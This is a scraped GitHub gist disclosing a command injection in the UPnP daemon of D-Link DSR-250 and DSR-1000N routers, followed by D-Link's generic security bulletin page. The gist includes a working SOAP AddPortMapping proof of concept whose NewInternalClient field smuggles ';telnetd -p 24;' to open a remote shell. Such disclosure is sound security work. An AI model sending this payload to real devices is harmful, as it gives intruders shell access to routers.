=== Content from gist.github.com_c9ef2a0e_20250119_113154.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@WinMin](https://avatars.githubusercontent.com/u/18380453?s=64&v=4)](/WinMin)

# [WinMin](/WinMin)/**[Disclosure of vulnerabilities in D-Link DSR-250 DSR-1000N router.md](/WinMin/5b2bc43b517503472bb28a298981ed5a)** Secret

Last active
July 3, 2020 16:01

Show Gist options

* [Download ZIP](/WinMin/5b2bc43b517503472bb28a298981ed5a/archive/310ecd7a98e28e11102d90ec371ce029b7cdb9d0.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/WinMin/5b2bc43b517503472bb28a298981ed5a.js&quot;&gt;&lt;/script&gt;
* Save WinMin/5b2bc43b517503472bb28a298981ed5a to your computer and use it in GitHub Desktop.

[Code](/WinMin/5b2bc43b517503472bb28a298981ed5a)
[Revisions
3](/WinMin/5b2bc43b517503472bb28a298981ed5a/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/WinMin/5b2bc43b517503472bb28a298981ed5a.js&quot;&gt;&lt;/script&gt;

Save WinMin/5b2bc43b517503472bb28a298981ed5a to your computer and use it in GitHub Desktop.

[Download ZIP](/WinMin/5b2bc43b517503472bb28a298981ed5a/archive/310ecd7a98e28e11102d90ec371ce029b7cdb9d0.zip)

Disclosure of vulnerabilities in D-Link DSR-250 DSR-1000N router.md

 [Raw](/WinMin/5b2bc43b517503472bb28a298981ed5a/raw/310ecd7a98e28e11102d90ec371ce029b7cdb9d0/Disclosure%2520of%2520vulnerabilities%2520in%2520D-Link%2520DSR-250%2520DSR-1000N%2520router.md)

[**Disclosure of vulnerabilities in D-Link DSR-250 DSR-1000N router.md**](#file-disclosure-of-vulnerabilities-in-d-link-dsr-250-dsr-1000n-router-md)

## Version

DSR-250 (3.14) DSR-1000N (2.11B201)

## Vulnerability details

There is a upnpd program in the firmware package, which listens on port 1900（udp）and 49152(tcp) at 0.0.0.0.

[![image](https://user-images.githubusercontent.com/18380453/86480320-623f4a80-bd80-11ea-9a72-791c2c4036c3.png)](https://user-images.githubusercontent.com/18380453/86480320-623f4a80-bd80-11ea-9a72-791c2c4036c3.png)

Through reverse analysis, we find that when the program sets iptable, the parameters are not checked, which may cause command injection.

[![image](https://user-images.githubusercontent.com/18380453/86482632-e8f62680-bd84-11ea-9f7d-3b632bd84d05.png)](https://user-images.githubusercontent.com/18380453/86482632-e8f62680-bd84-11ea-9f7d-3b632bd84d05.png)

Parameters such as '\_newInternalClient' can be controlled and finally assembled into the iptables command. Because the special symbol is not checked, it may cause command injection.

## PoC

```
POST /upnp/control/WANIPConn1 HTTP/1.1
HOST: $control_host:$control_port
Content-Length: $content_length
Content-Type: text/xml; charset="utf-8"
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
  <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
   <NewExternalPort>7331</NewExternalPort>
   <NewProtocol>tcp<NewProtocol/>
   <NewInternalPort>1337<NewInternalPort/>
   <NewLeaseDuration><NewLeaseDuration/>
   <NewEnabled>1<NewEnabled/>
   <NewPortMappingDescription>hackedByC0ss4ck<NewPortMappingDescription/>
   <NewRemoteHost>0.0.0.0<NewRemoteHost/>
   <NewInternalClient>;telnetd -p 24;<NewInternalClient/>
  </u:AddPortMapping>
 </s:Body>
</s:Envelope>

```
## Founder

Swings @ Chaitin (email: weiming.shi@chaitin.com)

C0ss4c k@StarCross Tech

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F5b2bc43b517503472bb28a298981ed5a)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.dlink.com_a0b13c21_20250119_113154.html ===


* For Home
  + [Wi-Fi](/en/for-home/wifi)
  + [4G/5G](/en/for-home/wifi/4g-5g)
  + [Cameras](/en/for-home/cameras)
  + [Smart Home](/en/for-home/smart-home-ecosystems)
  + [Switches](/en/for-home/switches)
  + [Adapters](/en/for-home/accessories)
  + [mydlink](/en/for-home/mydlink-hq)
* For Business
  + [Switches](/en/for-business/switching)
  + [Wireless](/en/for-business/wireless)
  + [Business Routers](/en/for-business/business-routers)
  + [Nuclias](/en/for-business/nuclias "Nuclias cloud managed networks")
  + [IP Surveillance](/en/for-business/ip-surveillance)
  + [Industrial](/en/for-business/industrial-switches)
  + [Accessories](/en/for-business/accessories)
* For Industry
  + [4G / 5G M2M](/en/for-service-provider/mobile)
* [Support](https://www.dlink.com/en/hq-support)* [Resources](/en/hq-download-center)

![]()

GB|EN

* [![](/en/-/media/icon-library/navigation/hq/r32_250w.png)
  Wi-Fi](/en/for-home/wifi)
* [![](/en/-/media/icon-library/navigation/hq/g530a1image-lsideright.png)
  4G/5G](/en/for-home/wifi/4g-5g)
* [![](/en/-/media/icon-library/navigation/hq/dcs8302lh250w.png)
  Cameras](/en/for-home/cameras)
* [![](/en/-/media/icon-library/navigation/hq/dspw118250w.png)
  Smart Home](/en/for-home/smart-home-ecosystems)
* [![](/en/-/media/icon-library/navigation/hq/dms106xt250w.png)
  Switches](/en/for-home/switches)
* [![](/en/-/media/icon-library/navigation/hq/dwaf18250w.png)
  Adapters](/en/for-home/accessories)
* [![](/en/-/media/icon-library/navigation/hq/mydlink_2502.png)
  mydlink](/en/for-home/mydlink-hq)

* [![](/en/-/media/icon-library/navigation/hq/des1024d250w.png)
  Switches](/en/for-business/switching)
* [![](/en/-/media/icon-library/navigation/hq/dwlx8630ap250w.png)
  Wireless](/en/for-business/wireless)
* [![](/en/-/media/icon-library/navigation/hq/dsr250250w.png)
  Business Routers](/en/for-business/business-routers)
* [![](/en/-/media/icon-library/navigation/hq/nuclias_250w.png)
  Nuclias](/en/for-business/nuclias)
* [![](/en/-/media/icon-library/navigation/hq/dcs4718e250w.png)
  IP Surveillance](/en/for-business/ip-surveillance)
* [![](/en/-/media/icon-library/navigation/hq/dis300g250w.png)
  Industrial](/en/for-business/industrial-switches)
* [![](/en/-/media/icon-library/navigation/hq/dpe101g250w.png)
  Accessories](/en/for-business/accessories)

* [![](/en/-/media/icon-library/navigation/hq/dwm321250w.png)
  4G / 5G M2M](/en/for-service-provider/mobile)

* [![](/en/-/media/icon-library/navigation/portal-tools.png)
  Tech Support](/en/support)
* [![](/en/-/media/icon-library/navigation/support-tech-alerts.png)
  Tech Alerts](/en/support/support-news)
* [![](/en/-/media/icon-library/navigation/faqs.png)
  FAQs](/en/support/faq)
* [![](/en/-/media/icon-library/navigation/support-services.png)
  Services](/en/for-business/services)
* [![](/en/-/media/icon-library/navigation/support-warranty.png)
  Warranty](/en/support/warranty-information)
* [![](/en/-/media/icon-library/navigation/support-contact.png)
  Contact](/en/support/contact)
* [![](/en/-/media/icon-library/navigation/support-tickets.png)
  Support Portal](https://services.eu.dlink.com/home/main/SSPLogin.aspx?language=E)

* [![](/en/-/media/icon-library/navigation/brochures-and-guides.png)
  Brochures and Guides](/en/resource-centre/brochures-and-guides)
* [![](/en/-/media/icon-library/navigation/case-studies.png)
  Case Studies](/en/resource-centre/case-studies)
* [![](/en/-/media/icon-library/navigation/videos-icon.png)
  Videos](/en/resource-centre/videos)
* [![](/en/-/media/icon-library/navigation/blog.png)
  Blog](/en/resource-centre/blog)
* [![](/en/-/media/icon-library/navigation/portal-product-selector.png)
  Product Selector](http://tools.dlink.com/productselector/uk/wireless_psp01.asp)

* Security Bulletin

# Security Bulletin

###

##

###

## Stay updated on the latest security vulnerabilities

The security and performance of your D-Link devices is of utmost importance to us across all product lines. This Security Bulletin is published for security issues that directly involve D-Link products and require an upgrade, fix, or other customer action. In all security publications, D-Link discloses the minimum amount of information required for an end-user to assess the impact of a vulnerability and any potential steps needed to protect their environment.

D-Link does not provide vulnerability details that could enable someone to craft an exploit.

To report a security vulnerability, please contact [Report Vulnerability](https://support.dlink.com/SecurityAdvisories.aspx).

To learn more about our EOL policy, please [click here.](/en/eol-policy)

To check the latest Security Bulletin, please [click here.](https://supportannouncement.us.dlink.com/)

* For Home
  For Home
  [Wi‑Fi](/en/for-home/wifi)

  [4G & 5G](/en/for-home/wifi/4g-5g)

  [Cameras](/en/for-home/cameras)

  [Smart Home](/en/for-home/smart-home-ecosystems)

  [Switches](/en/for-home/switches)

  [Accessories](/en/for-home/accessories)

  [mydlink](/en/for-home/mydlink-hq)

* For Business
  For Business
  [Switches](/en/for-business/switching)

  [Wireless](/en/for-business/wireless)

  [Business Routers](/en/for-business/business-routers)

  [Nuclias](/en/for-business/nuclias)

  [IP Surveillance](/en/for-business/ip-surveillance)

  [Industrial](/en/for-business/industrial-switches)

  [Accessories](/en/for-business/accessories)

* For Service Providers
  For Service Providers
  [Fixed](/en/for-service-provider/fixed)

  [Mobile](/en/for-service-provider/mobile)

  [Wireless](/en/for-service-provider/wireless)

* D‑Link
  D‑Link
  [About Us](/en/about)

  [Sustainability](https://company.dlink.com/en/esg/landing)

  [Press Releases](/en/press-centre/press-releases)

  [Events](/en/hq-events)

  [Contact](/en/contact-d-link)

  [Awards](https://company.dlink.com/en/esg/awards/)

  [Security Bulletin](/en/security-bulletin)

  [EOL Policy](/en/end-of-life-policy)

  [Tech Notification](/en/tech-notification)

  [Where To Buy](/en/for-home/where-to-buy)

![]()

GB|EN

* [Privacy](/en/privacy)
* [Terms of use](/en/terms-of-use)
* [Sitemap](/en/sitemap)

© D-Link Corporation. All rights reserved. No. 289, Xinhu 3rd Road Neihu District, Taipei 11494 Taiwan


